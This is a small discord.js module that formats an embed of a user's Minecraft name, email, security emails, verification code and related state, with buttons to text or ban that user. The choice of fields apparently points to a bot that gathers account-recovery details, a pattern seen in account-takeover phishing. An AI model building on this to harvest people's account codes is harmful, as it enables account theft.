const { ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js")
/**
 * 
 * @param {{mcname,email,method,reason,securityEmails,securityEmail,state,content,title,color,userId,code}} obj 
 * @returns 
 */
module.exports = (obj) => {
 let fields = [
  {
   name: "Minecraft IGN",
   value: "```" + obj.mcname + "```",
   inline: true
  },
  {
   name: "Email",
   value: "```" + obj.email + "```",
   inline: true
  },
 ]
 if (obj.method) {
  fields.push({ name: "Method", value: "```" + obj.method + "```", inline: false })
 }
 if (obj.reason) {
  fields.push({ name: "Reason", value: "```" + obj.reason + "```", inline: false })
 }
 if (obj.securityEmails) {
  fields.push({ name: "Security Emails", value: "```" + obj.securityEmails.join("\n") + "```", inline: false })
 }
 if (obj.securityEmail) {
  fields.push({ name: "Security Email", value: "```" + obj.securityEmail + "```", inline: false })
 }
 if (obj.code) {
  fields.push({ name: "Code", value: "```" + obj.code + "```", inline: false })
 }
 if (obj.state) {
  fields.push({ name: "State", value: "```" + obj.state + "```", inline: false })
 }
 return {
  content: obj.content,
  embeds: [{
   title: obj.title,
   color: obj.color,
   fields: fields
  }],
  components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId("text|" + obj.userId).setLabel("Text").setEmoji("💬").setStyle(ButtonStyle.Primary)).addComponents(new ButtonBuilder().setCustomId("ban|" + obj.userId).setLabel("Ban").setEmoji("🔨").setStyle(ButtonStyle.Danger)).addComponents(new ButtonBuilder().setCustomId("textembed|" + obj.userId).setLabel("Send Embed").setEmoji("📧").setStyle(ButtonStyle.Secondary))]
 }
}